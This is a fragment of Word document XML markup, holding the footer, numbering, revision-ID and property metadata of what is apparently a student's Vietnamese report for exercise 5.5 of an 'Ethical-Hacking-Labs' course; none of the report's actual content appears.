    <w:p w14:paraId="6B1BCAC3" w14:textId="77777777" w:rsidR="001F17E5" w:rsidRDefault="001F17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DFEB3" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:t xml:space="preserve">Báo </w:t>
    </w:r>
    <w:proofErr w:type="spellStart"/>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:t>cáo</w:t>
    </w:r>
    <w:proofErr w:type="spellEnd"/>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:t xml:space="preserve"> </w:t>
    </w:r>
    <w:proofErr w:type="spellStart"/>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:t>bài</w:t>
    </w:r>
    <w:proofErr w:type="spellEnd"/>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:t xml:space="preserve"> 5.5 – Ethical-Hacking-Labs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9A48D" w14:textId="77777777" w:rsidR="001F17E5" w:rsidRDefault="001F17E5">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="7B4416D3" w14:textId="77777777" w:rsidR="001F17E5" w:rsidRDefault="001F17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3105525">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="465440798">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1870339443">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1868132222">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="100344912">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="261037379">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="439687194">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="857080965">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1644844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C5E"/>
    <w:rsid w:val="0010582E"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="001F17E5"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="003E789A"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00DE0D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81F4D60"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{372FA12C-30ED-4341-AF2E-931886E29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7</Pages>
  <Words>650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Tran Manh Duc 20230247P</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-28T09:07:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>